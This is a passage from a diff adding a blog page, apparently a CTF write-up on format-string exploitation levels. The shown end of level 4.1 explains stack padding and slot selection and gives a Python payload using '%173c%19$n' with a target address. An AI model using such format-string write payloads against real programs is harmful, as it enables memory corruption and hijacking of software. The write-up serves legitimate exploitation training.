class="ch">\n</span><span class="st">&quot;</span></span></code></pre></div>
+<p>so 8 bytes should be enough padding then, right? clearly 18 is filled, and 19 would be the "clean" slot. however, there is one caveat:</p>
+<p>because the payload we are sending will be more than 8 bytes by default, we can't do 8 bytes of padding. however, our payload will obviously be less than 16, so we can just do 16 bytes of padding. if this doesn't make sense get a grip</p>
+<h3 id="solve-3"><a href="#solve-3" class="anchor">#</a>solve</h3>
+<div class="sourceCode" id="cb26"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a>spec <span class="op">=</span> <span class="st">b&#39;%173c%19$n&#39;</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> spec.ljust(<span class="dv">16</span>, <span class="st">b&#39;A&#39;</span>) <span class="op">+</span> p64(<span class="bn">0x404130</span>)</span></code></pre></div>
+
+    </div>
+
+    <nav class="post-nav" aria-label="more posts">
+        <a class="prev" href="/posts/untitled03/" rel="prev"><span class="post-nav-label">‹ older</span>untitled03</a>
+        
+    </nav>
+</article>
+
+<aside class="post-aside" aria-label="on this page">
+    <ul class="aside-actions">
+        <li><a href="/posts/untitled03/" title="older: untitled03" aria-label="older post">‹</a></li>
+        
+        <li><a href="#top" class="to-top" title="back to top" aria-label="back to top">↑</a></li>
+    </ul>
+    <nav class="toc toc-side" aria-label="contents"><ol><li class="toc-h2"><a href="#level-30">level 3.0</a></li><li class="toc-h3"><a href="#checksec-functions-running-binary">checksec, functions, running binary</a></li><li class="toc-h3"><a href="#disass-main">disass main</a></li><li class="toc-h3"><a href="#diass-func">diass func</a></li><li class="toc-h3"><a href="#solve">solve</a></li><li class="toc-h2"><a href="#level-31">level 3.1</a></li><li class="toc-h3"><a href="#challenge-info">challenge info</a></li><li class="toc-h3"><a href="#static-analysis-via-ida-pro">static analysis via ida pro</a></li><li class="toc-h3"><a href="#solve-1">solve</a></li><li class="toc-h2"><a href="#level-40">level 4.0</a></li><li class="toc-h3"><a href="#finding-correct-padding--slot">finding correct padding + slot</a></li><li class="toc-h3"><a href="#n-gimmick">%n gimmick</a></li><li class="toc-h3"><a href="#solve-2">solve</a></li><li class="toc-h2"><a href="#level-41">level 4.1</a></li><li class="toc-h3"><a href="#check_win">check_win</a></li><li class="toc-h3"><a href="#finding-clean-slot">finding clean slot</a></li><li class="toc-h3"><a href="#solve-3">solve</a></li></ol></nav>
+</aside>
+
+        </main>
+        <footer class="site-footer">
+    <span class="footer-left">
+        <span>&copy; 2024–2026 river</span>
+        <button type="button" class="contact-button" aria-controls="toast" data-label="email" data-value="Y29udGFjdEByaXZlcnMuc2g=">email</button><button type="button" class="contact-button" aria-controls="toast" data-label="signal" data-value="cml2LjEzMzc=">signal</button><button type="button" class="contact-button" aria-controls="toast" data-label="pgp" data-value="QzREQiAxMjc3IDJCQjUgNDY1NyBFQjM3IDQxODQgOEE3QSAwOTQyIDFEQjQgODE4Mg==">pgp</button>
+    </span>
+    <span class="footer-links">
+        <a href="/atom.xml">atom</a>
+        <button type="button" class="scheme-toggle" title="switch colour scheme">scheme: <span class="scheme-name">river</span></button>
+    </span>
+    <div class="toast" id="toast" role="status" aria-live="polite" hidden></div>
+</footer>
+
+    </div>
+    <script src="/js/main.js" defer></script>
+    
+    
+    <script>
+    // oneko chases the cursor, so skip it on touch screens
+    (function () {
+      if (!matchMedia("(hover: hover) and (pointer: fine)").matches) return;
+      var s = document.createElement("script");
+      s.src = "/js/oneko.js";
+      document.body.appendChild(s);
+    })();
+    </script>
+    
+</body>
+</html>
